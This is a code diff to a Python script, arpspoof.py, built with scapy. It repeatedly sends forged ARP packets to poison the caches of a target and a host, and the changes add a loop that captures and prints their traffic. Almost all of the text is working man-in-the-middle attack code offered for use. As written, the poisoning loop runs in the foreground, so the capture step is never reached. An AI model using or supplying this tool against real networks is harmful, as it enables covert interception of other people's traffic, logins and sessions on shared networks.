@@ -7,7 +7,7 @@ Steps:
 
 '''
 import argparse
-from scapy.all import Ether, ARP, sr, send
+from scapy.all import Ether, ARP, sr, send, sniff
 from time import sleep
 import threading
 import sys
@@ -15,22 +15,10 @@ import sys
 def get_mac_address(ip):
 	#Make ARP Request to get MAC addy for given ip
 	#print(f'Making ARP Request for {ip}')
-	'''print('Making ARP Request for {}'.format(ip))
-	
-	#arp_pkt = Ether('ff:ff:ff:ff:ff:ff')/ARP(pdst=ip)
-	response, extra = srp(Ether('ff:ff:ff:ff:ff:ff')/ARP(pdst=ip, op='is-at'), timeout=5, verbose=0)
-	mac = None
-	if response:
-		#print(response[0][1].src)
-		mac = response[0][1].src
-	#print(f'{ip} => {mac}')
-	print('{} => {}'.format(ip, mac))
-	'''
-	resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), retry=2, timeout=10)
+	resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), retry=2, timeout=10, verbose=0)
 	for s,r in resp:
 		print(resp[0][1][ARP].hwsrc)
 		return resp[0][1][ARP].hwsrc
-
 
 def clean_ip(addr):
 	#Makes sure that the ip address is valid
@@ -61,8 +49,8 @@ def poison(mac_1=None, ip_1=None, mac_2=None, ip_2=None):
 		
 		while True:
 			#Send arp packet to 
-			send(pkt12)	
-			send(pkt21)
+			send(pkt12, verbose=0)	
+			send(pkt21, verbose=0)
 		
 			#Wait a couple seconds
 			sleep(3)
@@ -72,6 +60,11 @@ def poison(mac_1=None, ip_1=None, mac_2=None, ip_2=None):
 
 def start_sniffing_stuff(t_ip, t_mac, h_ip, h_mac):
 	print('Sniffing initiated...')
+	
+	while(True):
+		pkt = sniff(count=1, filter=None, iface="eth1") #This 'iface' may have to change. My default of eth0 points to the wrong network
+		if pkt:
+			print('Received packet: {}'.format(pkt.summary()))
 
 def spoof_time(t_ip, h_ip):
 	#print(f'Target IP: {t_ip}')
@@ -88,15 +81,13 @@ def spoof_time(t_ip, h_ip):
 	
 	#Kick off thread to poison the cache
 	poison_thread = threading.Thread(target=poison, args=(clean_mac(t_mac), t_ip, clean_mac(h_mac), h_ip), name='def_not_arp_spoof')
-	#poison_thread.run()
+	poison_thread.run()
 
 	#Receive traffic and output
 	start_sniffing_stuff(t_ip, t_mac, h_ip, h_mac)
 
-	sleep(3)
-
 if __name__ == '__main__':
-	#Usage : $ arpspoof.py -t <targetIP> -r <host>
+	#Usage : $ arpspoof.py -t <targetIP> -r <hostIP>
 	parser = argparse.ArgumentParser()
 	parser.add_argument('-t', help='target ip address')
 	parser.add_argument('-r', help='host ip address')
